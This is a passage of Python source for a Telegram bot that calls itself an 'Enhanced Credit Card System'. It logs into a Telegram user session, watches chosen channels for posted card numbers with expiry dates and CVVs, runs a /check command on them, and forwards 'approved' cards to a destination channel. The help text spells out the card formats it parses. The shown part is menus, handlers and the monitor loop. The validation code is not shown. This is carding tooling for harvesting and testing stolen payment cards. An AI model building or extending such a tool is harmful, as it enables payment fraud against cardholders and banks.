    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🔍 <b>Monitoring Settings</b>\n\n"
        f"<b>Status:</b> {monitoring_status}\n"
        f"<b>Monitored Channels:</b>\n{channel_list}\n"
        f"<b>Destination Channel:</b> {destination or 'Not set'}\n\n"
        f"Choose an option:",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def help_menu(query):
    """Help menu"""
    keyboard = [
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "❓ <b>Help</b>\n\n"
        "<b>Commands:</b>\n"
        "• /start - Show main menu\n"
        "• /check CARD - Check a credit card\n\n"
        "<b>Features:</b>\n"
        "• 🔐 Telegram session management\n"
        "• 📋 List all chats and channels\n"
        "• 🔍 Monitor channels for cards\n"
        "• ✅ Forward approved cards\n"
        "• ⚙️ Admin management\n\n"
        "<b>Card Formats:</b>\n"
        "• 51631030099XXXXX|08|26|155\n"
        "• 51631030099XXXXX|08/26|155\n"
        "• Multi-line format with CVV and EXP\n\n"
        "<b>Bot by:</b> @manrsx",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def add_channel_to_monitoring(query, channel_id):
    """Add channel to monitoring"""
    config = load_config()
    
    if channel_id not in config["monitoring"]["monitored_channels"]:
        config["monitoring"]["monitored_channels"].append(channel_id)
        save_config(config)
        
        await query.answer("✅ Channel added to monitoring!")
    else:
        await query.answer("⚠️ Channel already monitored!")

async def remove_channel_from_monitoring(query, channel_id):
    """Remove channel from monitoring"""
    config = load_config()
    
    if channel_id in config["monitoring"]["monitored_channels"]:
        config["monitoring"]["monitored_channels"].remove(channel_id)
        save_config(config)
        
        await query.answer("✅ Channel removed from monitoring!")
    else:
        await query.answer("⚠️ Channel not monitored!")

async def toggle_monitoring(query):
    """Toggle monitoring on/off"""
    config = load_config()
    
    config["monitoring"]["enabled"] = not config["monitoring"]["enabled"]
    save_config(config)
    
    status = "enabled" if config["monitoring"]["enabled"] else "disabled"
    await query.answer(f"✅ Monitoring {status}!")

async def set_destination_menu(query):
    """Set destination channel menu"""
    await query.edit_message_text(
        "🎯 <b>Set Destination Channel</b>\n\n"
        "Please send the channel ID where approved cards will be forwarded.\n\n"
        "Example: -1001234567890\n\n"
        "Use /cancel to go back.",
        parse_mode='HTML'
    )

async def add_admin_menu(query):
    """Add admin menu"""
    await query.edit_message_text(
        "➕ <b>Add Admin</b>\n\n"
        "Please send the user ID of the new admin.\n\n"
        "Example: 123456789\n\n"
        "Use /cancel to go back.",
        parse_mode='HTML'
    )

async def remove_admin_menu(query):
    """Remove admin menu"""
    config = load_config()
    
    admins = config["admins"]
    if len(admins) <= 1:
        await query.answer("❌ Cannot remove the last admin!")
        return
    
    keyboard = []
    for admin_id in admins:
        if admin_id != MAIN_ADMIN_ID:  # Don't allow removing main admin
            keyboard.append([InlineKeyboardButton(f"Remove {admin_id}", callback_data=f"remove_admin_{admin_id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="admin_settings")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "➖ <b>Remove Admin</b>\n\n"
        "Select an admin to remove:",
        parse_mode='HTML',
        reply_markup=reply_markup
    )

# =============================================================================
# MESSAGE HANDLERS FOR SETUP
# =============================================================================

async def handle_phone_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phone number input"""
    if not is_admin(update.effective_user.id):
        return
    
    phone_number = update.message.text.strip()
    
    # Validate phone number format
    if not phone_number.startswith('+'):
        await update.message.reply_text("❌ Please enter phone number with country code (e.g., +1234567890)")
        return
    
    # Authenticate with Telegram
    result, message = await authenticate_telegram_client(phone_number)
    
    if result:
        await update.message.reply_text("✅ Phone number saved! Please use /start to continue.")
    else:
        await update.message.reply_text(f"❌ Error: {message}")

async def handle_sms_code_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle SMS code input"""
    if not is_admin(update.effective_user.id):
        return
    
    code = update.message.text.strip()
    
    # Verify SMS code
    result, message = await verify_telegram_code(code)
    
    if result:
        await update.message.reply_text("✅ SMS code verified! Please use /start to continue.")
    else:
        if message == "Need 2FA password":
            await update.message.reply_text("🔑 Please enter your 2FA password:")
        else:
            await update.message.reply_text(f"❌ Error: {message}")

async def handle_2fa_password_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle 2FA password input"""
    if not is_admin(update.effective_user.id):
        return
    
    password = update.message.text.strip()
    
    # Verify 2FA password
    result, message = await verify_telegram_password(password)
    
    if result:
        await update.message.reply_text("✅ 2FA password verified! Please use /start to continue.")
    else:
        await update.message.reply_text(f"❌ Error: {message}")

async def handle_destination_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle destination channel input"""
    if not is_admin(update.effective_user.id):
        return
    
    try:
        channel_id = int(update.message.text.strip())
        
        config = load_config()
        config["monitoring"]["destination_channel"] = channel_id
        save_config(config)
        
        await update.message.reply_text(f"✅ Destination channel set to: {channel_id}")
    except ValueError:
        await update.message.reply_text("❌ Invalid channel ID. Please enter a number.")

async def handle_admin_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin user ID input"""
    if not is_admin(update.effective_user.id):
        return
    
    try:
        admin_id = int(update.message.text.strip())
        
        config = load_config()
        if admin_id not in config["admins"]:
            config["admins"].append(admin_id)
            save_config(config)
            await update.message.reply_text(f"✅ Admin added: {admin_id}")
        else:
            await update.message.reply_text("⚠️ User is already an admin!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Please enter a number.")

# =============================================================================
# MAIN SYSTEM FUNCTIONS
# =============================================================================

async def run_telegram_monitor():
    """Run the Telegram channel monitor"""
    print("🔍 Starting Telegram Channel Monitor...")
    
    config = load_config()
    
    if not config["telegram_session"]["is_authenticated"]:
        print("❌ Telegram session not authenticated!")
        return
    
    client = await setup_telegram_client()
    if not client:
        print("❌ Failed to setup Telegram client!")
        return
    
    # Register event handler
    client.add_event_handler(handle_telegram_message, events.NewMessage)
    
    print("✅ Telegram Monitor Started Successfully!")
    print("🔗 Monitoring channels for cards...")
    
    try:
        await client.run_until_disconnected()
    except KeyboardInterrupt:
        print("\n👋 Stopping monitor...")
    finally:
        await client.disconnect()

async def run_bot():
    """Run the main bot"""
    print("🤖 Starting Enhanced Credit Card Bot...")
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("✅ Enhanced Bot Started Successfully!")
    await application.run_polling()

async def run_unified_system():
    """Run the unified system"""
    print("🚀 Starting Enhanced Credit Card System...")
    
    config = load_config()
    
    # Start both systems concurrently
    tasks = []
    
    # Start bot
    tasks.append(asyncio.create_task(run_bot()))
    
    # Start Telegram monitor if authenticated
    if config["telegram_session"]["is_authenticated"]:
        tasks.append(asyncio.create_task(run_telegram_monitor()))
    
    # Wait for all tasks
    try:
        await asyncio.gather(*tasks)
    except KeyboardInterrupt:
        print("\n👋 Stopping enhanced system...")

# =============================================================================
# MAIN FUNCTION
# =============================================================================

async def main():
    """Main function"""
    await run_unified_system()

if __name__ == '__main__':
    asyncio.run(main())
